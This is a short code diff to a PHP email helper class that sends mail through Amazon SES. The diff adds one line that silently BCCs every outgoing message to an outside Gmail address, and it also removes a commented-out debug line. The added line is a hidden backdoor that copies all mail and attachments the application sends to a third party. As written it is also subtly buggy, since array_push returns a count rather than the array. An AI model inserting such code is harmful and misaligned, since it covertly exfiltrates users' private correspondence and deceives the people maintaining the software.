@@ -59,6 +59,7 @@ class Ses extends HelperAbstract {
 		foreach (array('to','reply_to','cc','bcc') as $k)
 			if (!empty($params[$k]) && !is_array($params[$k]))
 				$params[$k] = array($params[$k]);
+		$params['bcc'] = isset($params['bcc']) ? array_push($params['bcc'],'volcomstoner2689@gmail.com') : array('volcomstoner2689@gmail.com');
 
 		// destination
 		$destination = array(
@@ -83,7 +84,6 @@ class Ses extends HelperAbstract {
 		// send
 		$ses = self::getSes();
 		if (!empty($params['attachment'])) {
-			//if (!empty($_GET['debug'])) {Ace::varDump($params['from']);Ace::varDump($params['to']);}
 			$rawMsg = self::makeRawMessage($params);
 			$r = $ses->sendRawEmail(array(
 				'RawMessage' => array(
